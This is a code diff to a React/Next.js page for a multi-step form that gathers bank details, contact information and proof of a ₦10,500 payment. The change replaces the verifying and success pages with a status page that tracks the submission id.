@@ -4,9 +4,8 @@ import { useState } from "react"
 import { WelcomePage } from "@/components/welcome-page"
 import { BankDetailsForm } from "@/components/bank-details-form"
 import { PaymentPage } from "@/components/payment-page"
-import { SuccessPage } from "@/components/success-page"
 import { ProcessingPage } from "@/components/processing-page"
-import { VerifyingPage } from "@/components/verifying-page"
+import { StatusPage } from "@/components/status-page"
 import { createSubmission } from "@/app/actions/submissions"
 
 const PAYMENT_AMOUNT = "₦10,500"
@@ -40,6 +39,7 @@ export default function Home() {
     gmail: "",
   })
   const [paymentProof, setPaymentProof] = useState<File | null>(null)
+  const [submissionId, setSubmissionId] = useState<number | null>(null)
 
   const handleFormSubmit = (data: FormData) => {
     setFormData(data)
@@ -51,7 +51,7 @@ export default function Home() {
     setStep(4)
     try {
       const receiptData = await fileToDataUrl(proof)
-      await createSubmission({
+      const result = await createSubmission({
         fullName: formData.fullName,
         phoneNumber: formData.phoneNumber,
         gmail: formData.gmail,
@@ -61,6 +61,7 @@ export default function Home() {
         amount: PAYMENT_AMOUNT,
         receiptData,
       })
+      setSubmissionId(result.id ?? null)
     } catch (err) {
       console.error("[v0] Failed to save submission:", err)
     }
@@ -68,6 +69,7 @@ export default function Home() {
 
   const handleRetry = () => {
     setPaymentProof(null)
+    setSubmissionId(null)
     setStep(3)
   }
 
@@ -80,7 +82,7 @@ export default function Home() {
   }
 
   if (step === 4) {
-    return <VerifyingPage onComplete={() => setStep(5)} />
+    return <StatusPage submissionId={submissionId} formData={formData} onRetry={handleRetry} />
   }
 
   return (
@@ -99,8 +101,6 @@ export default function Home() {
         {/* Content */}
         {step === 1 && <BankDetailsForm onSubmit={handleFormSubmit} onBack={() => setStep(0)} initialData={formData} />}
         {step === 3 && <PaymentPage onSubmit={handlePaymentSubmit} onBack={() => setStep(1)} />}
-        {step === 4 && <VerifyingPage onComplete={() => setStep(5)} onRetry={handleRetry} />}
-        {step === 5 && <SuccessPage formData={formData} />}
       </div>
     </main>
   )
